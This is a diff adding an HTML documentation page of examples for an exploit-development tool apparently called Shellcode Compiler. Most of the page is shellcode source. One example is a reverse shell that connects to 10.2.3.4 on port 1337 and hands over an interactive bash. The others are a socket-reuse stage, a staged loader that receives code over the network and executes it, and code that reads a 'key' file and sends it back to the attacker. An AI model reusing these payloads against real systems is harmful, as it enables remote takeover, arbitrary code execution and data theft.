@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="generator" content="AsciiDoc 8.6.7" />
+<title>Shellcode Compiler Examples</title>
+<link rel="stylesheet" href="lib/asciidoc.css" type="text/css" />
+<link rel="stylesheet" href="lib/layout2.css" type="text/css" />
+<script type="text/javascript" src="lib/asciidoc.js"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+asciidoc.install(2);
+/*]]>*/
+</script>
+</head>
+<body>
+<div id="layout-menu-box">
+<div id="layout-menu">
+  <div>&#187;<a href="index.html">Home</a></div>
+  <div>&#187;<a href="examples.html">Examples</a></div>
+  <div>&#187;<a href="scc.html">Invocation</a></div>
+  <div>&#187;<a href="runtime.html">Runtime&nbsp;Library</a></div>
+  <div>&#187;<a href="python.html">Python&nbsp;Bindings</a></div>
+  <div>&#187;<a href="issues.html">Known&nbsp;Issues</a></div>
+</div>
+</div>
+<div id="layout-content-box">
+<div id="layout-banner">
+  <div id="layout-title">Shellcode Compiler</div>
+  <div id="layout-description">Advanced exploit development made easier</div>
+</div>
+<div id="layout-content">
+<div id="header">
+<h1>Shellcode Compiler Examples</h1>
+<div id="toc">
+  <div id="toctitle">Table of Contents</div>
+  <noscript><p><b>JavaScript must be enabled in your browser to display the table of contents.</b></p></noscript>
+</div>
+</div>
+<div id="content">
+<div id="preamble">
+<div class="sectionbody">
+<div class="paragraph"><p>The following are short examples of how to use the Shellcode Compiler to solve
+common shellcoding tasks.</p></div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_connect_back_shell">Connect-back Shell</h2>
+<div class="sectionbody">
+<div class="paragraph"><p>The following code will connect to 10.2.3.4 on port 1337 with an interactive
+bash session.</p></div>
+<div class="listingblock">
+<div class="content monospaced">
+<pre>void main()
+{
+        int s = create_tcp4_connection(IPV4_ADDR(10, 2, 3, 4), 1337);
+        redirect_io(s);
+        interactive_bash();
+}</pre>
+</div></div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_passing_socket_descriptor_from_previous_stage">Passing socket descriptor from previous stage</h2>
+<div class="sectionbody">
+<div class="paragraph"><p>The main() function can take arguments, which are to be passed on the stack from
+right to left (C calling convention).  When you transition to this shellcode, use
+a standard call instruction with the socket pushed onto the stack.</p></div>
+<div class="listingblock">
+<div class="content monospaced">
+<pre>void main(int sock)
+{
+        redirect_io(sock);
+        interactive_bash();
+}</pre>
+</div></div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_staged_shellcode">Staged shellcode</h2>
+<div class="sectionbody">
+<div class="paragraph"><p>You can use the computed goto syntax to transition to a new, larger shellcode buffer.
+The following example allocates a new buffer on the heap for shellcode of an arbitrary size.</p></div>
+<div class="listingblock">
+<div class="content monospaced">
+<pre>void main(int sock)
+{
+        int len;
+        recv(sock, &amp;len, 4, 0);
+
+        void* code = malloc(len);
+        recv_all(sock, code, len, 0);
+        goto *code;
+}</pre>
+</div></div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_read_a_file">Read a file</h2>
+<div class="sectionbody">
+<div class="paragraph"><p>The following shellcode reads a small file called <span class="monospaced">key</span> and sends it back over file
+descriptor 4, which is typically the incoming connection on a forking server.</p></div>
+<div class="listingblock">
+<div class="content monospaced">
+<pre>void main()
+{
+        char data[64];
+        int fd = open("key", O_RDONLY, 0);
+        int len = read(fd, data, 64);
+        write(4, data, len);
+}</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="footnotes"><hr /></div>
+</div>
+</div>
+</body>
+</html>
